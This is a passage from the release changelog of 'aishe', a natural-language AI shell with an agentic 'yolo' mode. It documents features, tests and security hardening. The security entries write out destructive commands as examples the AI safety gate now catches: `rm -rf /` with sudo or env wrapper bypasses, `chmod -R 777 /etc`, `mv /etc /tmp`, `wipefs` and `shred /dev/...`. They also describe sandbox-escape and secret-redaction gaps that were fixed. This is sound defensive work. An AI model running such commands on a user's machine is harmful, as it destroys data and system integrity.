  sandbox — see docs/safety.md.)

### Fixed
- **The interactive prompt can no longer hang on a slow/dead LLM endpoint.** The
  shell-hook helpers (`--suggest-line`/`--auto-line`) enforce a hard wall-clock
  budget (SIGALRM) so a typo never freezes your prompt, and the provider now uses
  a 5s connect timeout to fast-fail an unreachable endpoint.
- **Lifecycle cleanup.** The PTY front-end removes its temp `ZDOTDIR` on exit
  (incl. panic), restores the terminal on `SIGTERM`/`SIGHUP`, and the zsh/bash
  hooks remove their per-shell temp files on shell exit (chaining onto any
  existing bash `EXIT` trap without mangling it).
- **Atomic writes.** `config.toml` and the session-memory file are written via a
  temp file + `rename`, so a crash mid-write can't corrupt them.

## [0.2.0] - 2026-06-12

### Added
- **First-class `mode`/`model`/`provider`/`config`/`mcp`/`commands`/`skills`
  subcommands.** `aishe mode`, `aishe model`, and `aishe provider` show the
  current value or save a new one to your config (`aishe mode auto`); `aishe
  config`/`mcp`/`commands`/`skills` print the active config and registries. Being
  real subcommands, they work the same in the zsh-PTY shell, a plain shell, or a
  script — replacing the interactive-only meta commands that lived in the removed
  reedline REPL. Setters write to the user config (a project overlay or a
  same-command `--mode`/`--provider` flag is not baked in).

### Removed
- **The built-in reedline editor is gone; aishe now commits to zsh.** The
  interactive shell is the zsh-PTY wrapper (your real zsh with the AI hook), so
  the self-contained line editor and everything specific to it were removed: the
  `completer`, `highlight`, `ghost`, `prompt`, `theme`, `validator`,
  `history_expand`, and `histfilter` modules; the `reedline`/`nu-ansi-term`
  dependencies; the `--pty`/`--no-pty` flags; and the reedline-only config keys
  (`front_end`, `edit_mode`, `prompt_format`, `git_prompt`, `git_status`,
  `show_right_prompt`, `report_time`, `hist_ignore*`, `correct`, `complete_flags`,
  `ghost_text`, `[theme]`). Unknown keys are ignored on load, so existing config
  files keep working. **The interactive shell now requires zsh**; `aishe -c …`,
  piped stdin, and the bash hook (`aishe init bash`) still work without it. The
  live `aishe <meta>` toggles (mode/provider/theme/...) that only existed in the
  removed REPL are gone; set mode/model/provider via flags, the config file,
  `$AISHE_MODE`, or Shift-Tab (mode cycle) instead.

### Fixed
- **`run_captured` no longer hangs past its timeout.** Captured commands now run
  in their own process group, and the whole group is reaped on timeout or
  completion. Previously a pipeline (`sleep 30 | cat`) or a backgrounded job
  (`sleep 30 &`) left a child holding the output pipe, so the drainer threads
  blocked forever and the timeout never fired (this is the path yolo uses to run
  commands). The drain is also bounded so a re-parented daemon can't wedge it.

### Security
- **Safety gate now flags `mv` / recursive `chmod` / `chown` on system paths.**
  `mv /etc /tmp`, `chmod -R 777 /etc`, `chown -R root /usr`, and similar were
  classified Safe (only a bare `/` was caught), so in `auto`/`yolo` they ran
  without confirmation. They now get the same path-aware treatment as `rm -rf`;
  in-tree relative moves and recursive perm changes on the cwd stay Safe.
- **Secret redaction now catches bare credential names.** `PASSWORD=`, `SECRET=`,
  `TOKEN=`, `API_KEY=`, etc. (the keyword with no prefix) were not redacted from
  the model-context block or the audit log; only prefixed names like
  `DB_PASSWORD=` were. Bare unambiguous secret names are now redacted (the short,
  common word `auth` stays prefix-only so `authors=`/`authority=` survive).
- **yolo sandbox closes a `$HOME` write escape.** With the sandbox on, a write to
  `$HOME/...` or `${TMPDIR}/...` was treated as in-tree; a variable-expanded
  target is now correctly counted as out-of-tree, matching the safety gate.
- **Provider retry honors but clamps `Retry-After`.** A `Retry-After: 0` no longer
  triggers a zero-delay retry against a rate-limiting server (clamped to >= 1s).

## [0.1.6] - 2026-06-11

### Changed
- **Yolo mode is much quieter by default.** It no longer dumps every command's
  full output to the terminal; instead it shows a compact per-step result (the
  command, then its exit code and line count, plus a short tail on failure). The
  model still receives the complete output. Set `yolo_verbose = true` to stream
  everything live as before.

### Fixed
- **Auto/suggest mode silently tells a command from an answer.** When the model
  answers a question with prose (or returns a malformed command), aishe now
  syntax-checks the suggested command and, if it is not valid shell, surfaces it
  as an answer instead of printing a command for the shell to run. So a question
  no longer produces an ugly `(eval): parse error` or junk pre-fill, and the
  bogus "command" no longer lands in history. (The shell hook keeps a matching
  `zsh -nc` / `bash -nc` guard as a backstop.)

### Added
- **Deterministic scenario + fuzz tests for the zsh-PTY front-end.** A fake
  provider (`AISHE_FAKE_LLM` / `AISHE_FAKE_LLM_FILE`, inert unless set) drives the
  real `aishe zsh` wrapper with no network or key. `tests/pty_scenarios.py` covers
  NL routing, the `?`/`#` sigil (incl. a trailing `?`), command-name collisions,
  auto-mode never eval'ing a non-command, and up-arrow history (wired into CI).
  `tests/pty_fuzz.py` generatively runs hundreds of cases (real commands with
  pipes/redirs/globs/quoting, sigil NL stuffed with shell metacharacters, and
  adversarial model responses), asserting no parse/glob/eval error ever leaks.
- **Interactive signal/terminal tests for the zsh-PTY front-end.**
  `tests/pty_signals.py` (in CI) drives the real wrapped zsh through Ctrl-C
  mid-command (the shell survives and prompts again), Ctrl-C on an empty line,
  Ctrl-Z job suspension, window resize (SIGWINCH propagation updates `$COLUMNS`),
  and multi-line for-loop continuation.
- **Shift-Tab cycles the interaction mode** (`suggest -> auto -> yolo`), like
  Claude Code. In the zsh-PTY / `init zsh` front-end a ZLE widget rotates
  `AISHE_MODE` and repaints the prompt glyph (Shift-Tab still navigates an open
  completion menu first); bash binds the same to `\e[Z`; reedline falls through to
  the cycle only when no menu is open. Override the key with `AISHE_MODE_KEY`. The
  safety gate and `yolo_confirm` tier still apply, so cycling never bypasses a
  confirmation.
- **Config-precedence and provider step-down tests.** `Config::apply_overrides`
  makes the `--flags > file > defaults` order explicit and unit-tested;
  `resolve_audit` does the same for `AISHE_LOG`/`AISHE_LOG_FILE` vs the config
  file; `tests/cli.rs` adds E2E coverage of flag overrides and the legacy `llmsh`
  -> `aishe` config migration. The OpenAI-compatible structured-output step-down
  (`json_schema` -> `json_object` -> plain text, then give up) is now covered end
  to end in `tests/providers.rs`, with unit tests for the `step_down` /
  `is_format_error` helpers.
- **`SECURITY.md`.** A security policy: private vulnerability reporting (GitHub
  advisories + a contact email), supported versions, the security model
  (deterministic safety gate, confirmation tiers, best-effort sandbox,
  prompt-injection threats), data-handling/privacy notes, and hardening tips.
- **Per-project config (`.aishe/config.toml`) with a trust gate.** A repo can
  ship a config overlay, discovered like `.aishe/context.md` (walking up from the
  cwd) and merged between your user config and CLI flags. Safe, cosmetic keys (and
  a per-provider `model`) apply automatically; sensitive keys that could exfiltrate
  prompts, run code, or weaken safety (`provider`, endpoint/key, `[mcp_servers]`,
  `[logging]`, the safety toggles, and `mode = "yolo"`) apply only after you run
  `aishe trust` in that repo. `aishe trust [--list]` / `aishe untrust [--all]`
  (also `/trust`) manage it; trust is keyed by path + content hash so an edited
  file must be re-trusted. `aishe doctor` shows the active overlay and trust state.
  See [docs/project-config.md](docs/project-config.md).
- **`docs/architecture.md`.** A contributor's map of the codebase: design
  principles, the module layout, the routing decision order and command cache,
  both front-ends (the zsh-PTY hook handoff and reedline), the
  provider/`ResponseFormat`/step-down layer, modes/safety/sandbox, tools/MCP/skills,
  config precedence, and the test layout. Linked from the README and development.md.

## [0.1.5] - 2026-06-11

### Fixed
- **Sigil / force-NL lines are kept in zsh history.** The accept-line wrapper and
  force-NL key cleared the buffer to route a line to the AI, so the typed NL line
  never entered history. It is now recorded (`print -s`), so up-arrow recalls it.

### Added
- **Conversation memory in the zsh-PTY / `init zsh` front-ends.** Each
  natural-language line in the hook front-ends ran as a separate process with no
  shared state, so a follow-up like "is it enabled?" had no idea what "it" was.
  NL turns are now persisted to a per-shell session file (keyed by the shell PID,
  exported as `AISHE_SESSION_FILE`) and replayed into each request, so follow-ups
  keep context. Bounded by the existing transcript budget; honors the `memory`
  config option.

### Changed
- **zsh-PTY is the interactive front-end; zsh is required for it.** The built-in
  reedline editor reimplemented a shell and was the source of most terminal
  fragility, so it is now opt-in only (`aishe --no-pty` or `front_end =
  "reedline"`). When you start the interactive shell without zsh installed, aishe
  now tells you to install it (the installer can) instead of silently dropping
  into the reedline editor. `aishe -c …` and piped input are unaffected and still
  work with just bash. `aishe doctor` reports zsh as required for the shell. This
  is the first step of standardizing on the zsh-PTY front-end.

## [0.1.4] - 2026-06-11

### Added
- **Force a line to the AI with a `?` or `#` prefix.** Routing is by command
  name, so a question whose first word is a real command (`who`, `which`, `find`,
  `time`, `test`, `make`) would otherwise run that command. Starting a line with
  `?` or `#` now forces it to the AI in both front-ends. In the zsh-PTY front-end
  this is an `accept-line` wrapper that strips the sigil before zsh parses it (so
  the shell's comment/glob rules never apply) and routes it in the main shell;
  the existing force-NL key (Alt-Enter / `AISHE_NL_KEY`) uses the same path. The
  zsh hook's natural-language routing was refactored to share one code path
  between the handler, the key, and the sigil.

## [0.1.3] - 2026-06-11

### Added
- **`install.sh` ensures zsh.** Because aishe is most robust driving your real
  zsh in a PTY, the install script now installs zsh via the system package
  manager (apt/dnf/yum/zypper/pacman/apk/brew) when it is missing. Best effort
  and never fatal (aishe falls back to the reedline front-end); opt out with
  `AISHE_SKIP_ZSH=1`.
- **Branded prompt in the zsh-PTY front-end.** When driving your real zsh in a
  PTY, aishe now shows its own prompt (`<cwd> <glyph>`, with the glyph reflecting
  the mode (❯ suggest, » auto, ⚡ yolo), colored green/red by the last exit code,
  plus a dim `model · mode` right prompt), matching the reedline front-end, so
  it's obvious you're in aishe. On by default; disable with `pty_prompt = false`
  to keep your normal zsh prompt. Only the PTY front-end is affected; the
  `aishe init zsh` hook still leaves your prompt untouched.

## [0.1.2] - 2026-06-11

### Fixed
- **Reedline front-end no longer exits after one command on some terminals.** A
  transient terminal read error — most often reedline's cursor-position (DSR)
  query timing out over SSH, tmux, or screen — was treated as fatal, so aishe
  would drop back to the parent shell after running a single command. Such an
  error is now non-fatal: aishe warns and re-prompts, giving up only after
  several consecutive failures (a genuinely dead terminal). See `src/main.rs`.

## [0.1.1] - 2026-06-11

### Added
- **First-run wizard: service presets and an endpoint prompt.** Choosing an
  OpenAI-compatible provider now asks which service (OpenAI, Groq, OpenRouter,
  Together, Ollama, or a custom endpoint) and confirms the API endpoint (base
  URL), pre-filled from the preset along with a sensible default model and key
  env var. This fixes setup for non-OpenAI services like Groq, which previously
  always defaulted to `https://api.openai.com`. The wizard also prints a summary,
  normalizes the base URL (adds a scheme, trims a trailing slash), and is skipped
  with a default config written when aishe is not run interactively (a hook, a
  pipe, CI), so it never hangs.
- **Linux releases and packages.** The release workflow now produces, for every
  `v*` tag: static-musl and aarch64 Linux tarballs (built with `cargo-zigbuild`)
  in addition to the existing gnu/macOS ones; `.deb` and `.rpm` packages for
  `amd64`/`arm64` (via nfpm, installing the binary, bash/zsh/fish completions, and
  a generated `aishe(1)` man page); and `.sha256` checksums for all of them. A new
  `install.sh` (`curl -fsSL .../install.sh | sh`) detects the platform, downloads
  the right (static) binary, verifies its checksum, and installs it. See
  `nfpm.yaml`, `.github/workflows/release.yml`, and `docs/installation.md`.
- **Repo identity reconciled.** `billiondollarsolo/aishe` is the canonical
  repository; `Cargo.toml` `repository`, the `cargo binstall` `pkg-url`, the
  Homebrew formula URLs (now including aarch64-linux), and the docs all point
  there consistently.
- **Distribution and polish.** `aishe --version` now reports the build's git SHA
  and date (via `build.rs`); `aishe completions <bash|zsh|fish|...>` prints a
  shell completion script for aishe itself; `aishe doctor` adds version, MCP
  server, and history-file lines. The release workflow attaches per-target
  tarballs with `.sha256` checksums, `cargo binstall aishe` is wired up
  (`[package.metadata.binstall]`), and a Homebrew formula template
  (`packaging/aishe.rb`, which also installs completions) plus updated
  installation docs are included.
- **Pipe / script mode.** Piping into aishe with no `-c`
  (`printf 'cmd1\ncmd2\n' | aishe`) now runs each line like a one-shot command and
  returns the last exit code, instead of launching the interactive editor (which
  needs a terminal). An explicit `--pty`/`zsh` still wins.
- **`history` builtin + timestamped, cross-session history.** Every persisted
  command is also written to a sidecar log in zsh `EXTENDED_HISTORY` format
  (`: <epoch>:0;<command>`, which zsh can read). A new `history` builtin lists it
  (`history [N]`, `history -E` adds UTC timestamps). With `share_history` on (the
  default, zsh `SHARE_HISTORY`) the log and history file are shared across
  sessions, so commands from other sessions are visible; off makes history
  per-session. See `src/histlog.rs`.
- **Flag completion from `--help` (reedline).** Tab-completing a word that starts
  with `-` now offers the command's flags, parsed from its `--help` output (or
  `<tool> <sub> --help` for git/cargo/docker/...), with the descriptions shown in
  the menu. Results are cached per command and the `--help` call is time-limited
  and pager-suppressed, so a slow or pager-spawning command never freezes Tab;
  wrappers like `sudo` are never run. On by default (`complete_flags`).
- **Background-job control in the reedline front-end.** A trailing `&` now
  backgrounds a command, tracked in a job table so `jobs`, `fg`, `bg`, `wait`, and
  `disown` work; finished jobs are reported before the next prompt as `[n]+ Done`
  / `Exit N`. Full TTY job control (Ctrl-Z suspend, process groups) remains the
  zsh-PTY front-end's native domain.
- **Yolo confirmation tiers and a policy sandbox.** `yolo_confirm` chooses when
  the loop pauses to confirm a command: `never`, `dangerous` (only safety-flagged,
  the default), `writes` (also any state-modifying command), or `all` (the legacy
  `yolo_confirm_dangerous` boolean still works when `yolo_confirm` is unset).
  `yolo_sandbox` (off by default, `aishe sandbox on`) refuses a command that
  reaches the network or writes outside the working tree, feeding the reason back
  to the model. Best-effort policy, not a kernel sandbox. See `src/sandbox.rs`.
- **MCP Streamable HTTP transport.** MCP servers can now be reached over HTTP in
  addition to stdio: an `[mcp_servers.<name>]` entry with a `url` (and optional
  `headers`) connects over HTTP, parsing a JSON or SSE response and carrying the
  `Mcp-Session-Id` across calls. stdio servers are unchanged. See docs/mcp.md.
- **Per-project `.aishe/context.md`.** When building the model context, aishe
  includes a `.aishe/context.md` found at or above the cwd (nearest wins, capped
  at 4000 chars), so repo-specific conventions reach the model without repeating
  them. On by default (`project_context`). See docs/project-context.md.

### Changed
- **More robust provider retries.** Transient HTTP failures (429, 408, any 5xx,
  and connection errors) are now retried up to 3 times with exponential backoff
  plus jitter, honoring a `Retry-After` header on 429 (was a single fixed 2s
  retry). Shared across the blocking and streaming paths for both providers.
- **Streaming tolerates a truncated SSE response.** A read error mid-stream ends
  the stream gracefully (any text already delivered stands) instead of failing
  the whole turn.
- **`exit N` propagates its code** from `aishe -c 'exit N'` and sets the final
  exit status interactively.

### Fixed
- **A test could wipe `/tmp`.** `named_dir_expansion` canonicalized its temp dir
  before creating it; the failed canonicalize fell back to the temp root, so the
  test's cleanup ran `remove_dir_all` on the whole temp directory. It now creates
  the dir first.
- **More dispatcher edge cases no longer misroute to the LLM** (found by the
  expanded validation harness): scalar assignments with quoted or
  command-substituted values that contain spaces (`v='a b'`, `x=$(cmd args)`),
  array-element assignments (`m[k]=v`), `|` inside arithmetic/command
  substitution (`echo $((7 | 8))`), the `>|` clobber redirect, and the
  `unsetopt`/`integer`/`float` builtins. `split_top_level` is now paren-depth
  aware, and assignment-head detection handles any value.
- **Builtins no longer misroute to the LLM in one-shot/`-c` (and the first
  interactive prompt).** The shell-builtin list was fetched on a background
  thread, so `aishe -c 'print …'` / `let` / `typeset` / `jobs` / `:` could race
  the thread and be sent to the model. The fallback builtin set is now seeded
  **synchronously** at startup. (Caught by the expanded validation harness.)
- **zsh array assignments route to shell.** `arr=(a b c)` (spaces inside the
  parens) and `path+=(/x)` were tokenized into a bare value head and misrouted
  to the LLM; they're now recognized as shell. Added `repeat`/`:`/`noglob` to
  the builtin/keyword sets too.
- **Shell hook suggest-mode now actually prefills.** zsh/bash run the
  `command_not_found` handler in a *subshell*, so the old `print -z`/`READLINE_LINE`
  (and auto-mode `eval`) silently did nothing. The handler now hands off via a
  temp file to a `precmd` (zsh) / `PROMPT_COMMAND` (bash) hook that runs in the
  main shell — so suggestions prefill and safe auto commands run with `cd`/`export`
  persisting. (Found via live testing against a real model.)
- **Honor the system trust store** (`ureq` `native-certs`), so aishe works behind
  corporate / TLS-inspecting proxies whose CA isn't in the bundled root set.
- **No more spurious `LLM disabled` warning** on startup for purely-local use; the
  notice is shown once in the interactive REPL (or at the point an NL request needs
  the provider).

### Added
- **Response caching.** Identical suggest-mode requests are served from a small
  in-memory, TTL'd cache (`cache`, on by default; `cache_ttl_secs`, default 300),
  so a repeat is instant and costs no tokens (a cache hit never calls the model,
  leaving the usage line and budget untouched). The key includes the environment
  context (cwd, recent commands, git state), so running anything between two
  requests misses the cache and avoids stale suggestions. Streaming and the yolo
  tool loop are never cached. Toggle with `aishe cache on`/`off`. See
  `src/cache.rs`.
- **Plan-first (dry run) for yolo.** With `yolo_plan = true` (or `aishe plan on`),
  before the agentic loop runs anything the model lays out its intended steps and
  you approve them (`Proceed with this plan? [Y/n]`). It costs one extra planning
  call, threads the approved plan into the run, and applies only interactively (a
  piped/`-c` run has no one to approve, so it proceeds as before). Off by default;
  the planning call is metered and audit-logged as `mode: yolo-plan`.
- **MCP (Model Context Protocol) client.** Configure stdio MCP servers under
  `[mcp_servers]` and their tools are offered to the yolo loop, namespaced
  `mcp__<server>__<tool>` and proxied to the server when the model calls them.
  aishe does the JSON-RPC handshake (`initialize` / `initialized` / `tools/list`)
  over newline-delimited stdio, with a per-request timeout so a wedged server
  can't hang the shell, and kills servers on exit. List connected tools with
  `aishe mcp` (`/mcp`); each call is audit-logged. Any stdio server works
  (`npx`/`uvx`/a binary/Docker). See `src/mcp.rs` and docs/mcp.md.
- **Built-in web tool for yolo (`fetch_url`).** The agentic loop can now read a
  web page or docs directly: HTTP(S) GET, HTML stripped to readable text
  (`script`/`style` dropped, common entities decoded), with a read-time byte cap
  and a char cap before the text reaches the model. Use it instead of
  `curl`/`wget`. On by default (`web_tool`); each call is audit-logged as
  `yolo:fetch_url`.
- **Built-in file tools for yolo.** Beyond `run_command`, the agentic loop can
  now call `read_file`, `write_file`, `edit_file`, and `list_dir` to work with
  files precisely instead of round-tripping through `cat`/`sed`/heredocs. Writes
  outside the working tree are confirmed (when `yolo_confirm_dangerous`), and each
  call is audit-logged. On by default (`file_tools`).
- **Spelling correction and named directories (reedline).** With `correct = true`
  (zsh `CORRECT`), a mistyped first word that is a near-miss of a known command
  prompts `correct 'gti' to 'git'? [Y/n]` instead of going to the LLM (uses
  Damerau-Levenshtein so transpositions count as one typo). `[named_dirs]` adds
  `~name` expansion in `cd` (`cd ~proj`, `cd ~proj/app`).
- **Deeper zsh parity (reedline prompt, navigation, and history).** The right
  prompt now shows the **last command's duration** (`report_time`, like zsh
  REPORTTIME) and a richer **git segment**: `+` staged, `*` unstaged, `⇡N`/`⇣N`
  ahead/behind, and `⚑N` stashes (`git_status`). Navigation: **`AUTO_PUSHD`**
  (`auto_pushd`, with `cd -N`/`cd +N` and `dirs -v`) and **`cdpath`** (`cd <name>`
  searches extra base dirs / `$CDPATH`). History: **`HIST_IGNORE_DUPS`**
  (`hist_ignore_dups`, default on), **`HIST_IGNORE_SPACE`** (`hist_ignore_space`),
  and **`HISTIGNORE`** glob patterns (`hist_ignore`). (Full job control remains
  the zsh-PTY front-end's domain, where it works natively.)
- **Inline AI ghost text.** In the reedline front-end, aishe can predict the rest
  of your command as you type and show it as dim ghost text (accept with the Right
  arrow), Copilot/Warp style. A background worker (debounced, cached) keeps typing
  non-blocking; it shares the main provider so ghost tokens count in `aishe usage`
  and respect `budget_usd`, and the calls are audit-logged as `mode: ghost`. Off
  by default; toggle with `aishe ghost on` / `ghost_text`.
- **Hardened the safety gate against bypasses, with an adversarial corpus.** The
  gate now strips leading wrappers and env assignments before judging a command
  (`sudo -i rm -rf /`, `FOO=bar rm -rf /`, `env`/`time`/`nohup`/`nice`/`timeout`
  prefixes) and unquotes `rm` targets (`rm -rf "$HOME"`, `rm -rf '/'`), closing
  real under-flagging holes. Added `wipefs`, `shred /dev/...`, `git clean -f`,
  more device names, and cwd-wiping `rm -rf ./`/`./*`. New `tests/safety_corpus.rs`
  with ~90 dangerous (including bypass attempts) and ~60 benign look-alikes.
- **Secret redaction in the model context.** Recent commands sent to the model
  are scrubbed of likely credentials (secret-named assignments, `--password`/
  `--token` flags, URL credentials, `Authorization:` headers, known key shapes
  like `sk-`/`ghp_`/`gsk_`/`AKIA`, and long high-entropy tokens). On by default
  (`redact_secrets`). Heuristic, not a guarantee.
- **Audit logging.** Optional JSONL log of every AI call (`ai_request`), response
  with token usage (`ai_response`), error (`ai_error`), and AI-initiated command
  with exit code (`action`). Off by default; enable with `[logging] enabled` or
  `AISHE_LOG=1`, path via `AISHE_LOG_FILE`. Logged text is redacted unless
  disabled. `aishe doctor` shows redaction and logging status.
- **Conversation memory.** The interactive REPL now remembers recent
  natural-language turns (across suggest, auto, and yolo) so follow-ups like "now
  do the same for the other file" have context. It stores requests and replies
  (not the full tool transcript), is size-capped, and is never written to disk.
  Clear it with `aishe reset` (`/reset`); disable with `memory = false`.
- **Syntax-highlighted code blocks.** Rendered model answers now highlight fenced
  code blocks by language (via syntect, pure-Rust fancy-regex), for both streamed
  and non-streamed output. On by default; build `--no-default-features` for a
  smaller binary that renders code blocks plain.
- **Markdown re-render for streamed suggest/auto answers.** A streamed prose
  answer is re-rendered as markdown in place when it finishes, matching yolo.
- **Yolo streaming.** The agentic loop now streams the model's text live (over
  Anthropic and OpenAI-compatible SSE, including streamed tool calls), so long
  runs no longer look frozen. A streamed final answer is re-rendered as markdown
  in place when it fit on screen; piped or non-tty output stays plain. Providers
  without streaming tool support fall back to a single non-streaming call.
- **Token & cost accounting** — every model call's `usage` is metered; a dim
  `N in · N out · N req · ~$cost` line prints after each interaction (toggle with
  `show_usage`), and `aishe usage` (`/usage`) shows the session total. Cost uses a
  built-in price table (USD/Mtok) overridable per model in `[pricing]`.
- **Budget cap** — set `budget_usd` to stop calling the model once the estimated
  session cost reaches it (e.g. a runaway yolo loop halts cleanly). `0` =
  unlimited; only enforced when the model's price is known.
- **`docs/ROADMAP.md`** — the tracked backlog (AI-shell features, zsh parity,
  trust/safety, test surface).
- **zsh-PTY front-end** — drive your real interactive zsh inside a pseudo-terminal
  with every native plugin (zsh-autosuggestions, zsh-syntax-highlighting, fzf-tab,
  powerlevel10k, oh-my-zsh) unmodified. Now the **default** (`front_end = "auto"`)
  when zsh is on `$PATH`, falling back to the built-in reedline editor.
- **reedline editor parity** — context-aware tab completion (commands, file
  paths, `$VAR` env vars, directories-only for `cd`/`pushd`, `aishe`
  subcommands/values, and per-command subcommands for git/cargo/docker/npm with
  live git-branch completion), multi-line continuation for **control structures**
  (`for`/`while`/`if`/`case`) and function definitions, `Ctrl-R`
  history-search menu, multi-line continuation validator, emacs/vi keymaps
  (`edit_mode`, with `[I]`/`[N]` prompt tags in vi mode), and zsh-style history
  expansion (`!!`, `!$`, `!-N`, `^old^new`, …), **autocd** (bare directory name →
  cd), and a **directory stack** (`pushd`/`popd`/`dirs`).
- **Native shell hook niceties** — `auto`-mode runs safe commands directly via
  `eval` (state persists), dangerous ones are pre-filled; force-NL keybinding
  (Alt-Enter / Ctrl-G).
- **Token streaming** of suggest/auto answers (`stream` / `aishe stream`) over
  Anthropic and OpenAI-compatible SSE.
- **`.aishrc` startup file** sourced into every command, plus persistence of
  interactively-defined aliases, shell options, and **functions** (multi-line
  `name() { … }`) across the reedline front-end.
- **Custom prompt** (`prompt_format`), a **git branch segment** in the right
  prompt (`git_prompt`, read from `.git/HEAD`), and **theme presets** (`default`,
  `vivid`, `mono`, `nord`, `gruvbox`) with an `aishe theme` command.
- **Fuzzy completion** — case-insensitive matching with a subsequence fallback
  (`gco`→`git-checkout`).
- **Structured output** for suggest mode (`structured` = `schema` | `json` |
  `prompt`, default strict `schema`): requests a strict JSON Schema on providers
  that support it, auto-stepping down (schema → json → prompt) when a provider
  rejects it, on top of the existing defensive parsing. Configurable live via
  `aishe structured`.
- **`aishe doctor`** — environment check for shell, config, front-end, provider,
  and API key.
- **Slash-commands** — every meta command also works as `/mode`, `/config`, … and
  **user-defined plugins/skills**: Markdown command files in
  `~/.config/aishe/commands/` and `<project>/.aishe/commands/` (Claude-Code
  style) define custom `/commands` that run as shell snippets or NL prompt
  templates (`$ARGUMENTS`/`$1`), with `/commands` listing and tab-completion.
- **Skills (model-invoked)** — Markdown skill files in `~/.config/aishe/skills/`
  / `<project>/.aishe/skills/` are advertised to the model in yolo mode; it pulls
  a skill's full instructions into context on demand via a `use_skill` tool
  (Claude-Code-style progressive disclosure). `aishe skills` (`/skills`) lists
  what's loaded; both `/skills` and `/commands` also work non-interactively
  (`aishe -c`).
- **Claude Code compatibility** — real Agent Skills from `anthropics/skills`
  (e.g. `internal-comms`, `brand-guidelines`) and slash commands from community
  collections (e.g. `wshobson/commands`) drop into `~/.config/aishe/skills/` and
  `~/.config/aishe/commands/` unchanged; aishe reads the `name`/`description`
  frontmatter and ignores keys it doesn't use (`allowed-tools`, `model`,
  `license`, …). Verified end-to-end against a live model.
- **CI** — cross-platform tests plus PTY smoke tests for both front-ends. The
  validation harness (`tests/admin_validation.py`) gained a deterministic
  plugins suite (meta `/commands`·`/skills`·`/config`·`/help`, custom-command
  discovery + `shell:`/`$ARGUMENTS` execution) and model-gated checks for custom
  NL commands and model-invoked skills (progressive disclosure verified via a
  unique skill-body token).

### Changed
- **Renamed the project from `llmsh` to `aishe`** — binary, command, config dir
  (`~/.config/aishe`), `AISHE_*` env vars, and shell hooks. A one-time migration
  imports a pre-rename `~/.config/llmsh/config.toml` automatically.
- **Path-aware `rm -rf`** — relative, in-tree targets (e.g. `rm -rf node_modules`)
  are no longer flagged; absolute/home/variable/glob/escaping targets still are.

## [0.1.0]

- Initial natural-language-aware shell: behaves like zsh for real commands,
  routes anything else to an LLM (suggest / auto / yolo), with a conservative
  safety gate. Anthropic + OpenAI-compatible providers, themable reedline editor,
  and a native `command_not_found` hook.
